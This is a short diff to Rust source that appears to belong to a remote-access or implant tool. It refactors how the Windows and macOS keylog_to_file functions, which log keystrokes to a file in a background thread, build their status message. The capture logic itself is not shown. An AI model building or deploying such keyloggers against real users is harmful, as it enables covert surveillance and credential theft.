@@ -278,6 +278,9 @@ pub fn keylog(seconds: u64) -> Result<crate::sessions::Stream, String> {
 /// own pace, and it keeps the whole of a session in one place.
 #[cfg(windows)]
 pub fn keylog_to_file(path: &str, seconds: u64) -> Result<String, String> {
+    // The report is built before the thread takes the path: the caller is told
+    // where the keys go even if the file cannot be opened.
+    let report = format!("the key logger writes to {path}\n");
     let path = path.to_string();
     std::thread::spawn(move || {
         let mut file = match std::fs::OpenOptions::new()
@@ -305,7 +308,7 @@ pub fn keylog_to_file(path: &str, seconds: u64) -> Result<String, String> {
             std::thread::sleep(std::time::Duration::from_millis(50));
         }
     });
-    Ok(format!("the key logger writes to {path}\n"))
+    Ok(report)
 }
 
 /// The key logger that writes into a file is a Windows or macOS capability.
@@ -647,6 +650,7 @@ pub fn keylog(seconds: u64) -> Result<crate::sessions::Stream, String> {
 /// Write the keys into a file instead of streaming them.
 #[cfg(target_os = "macos")]
 pub fn keylog_to_file(path: &str, seconds: u64) -> Result<String, String> {
+    let report = format!("the key logger writes to {path}\n");
     let path = path.to_string();
     std::thread::spawn(move || {
         let file = match std::fs::OpenOptions::new()
@@ -664,5 +668,5 @@ pub fn keylog_to_file(path: &str, seconds: u64) -> Result<String, String> {
             eprintln!("key logger: {path}: {e}");
         }
     });
-    Ok(format!("the key logger writes to {path}\n"))
+    Ok(report)
 }
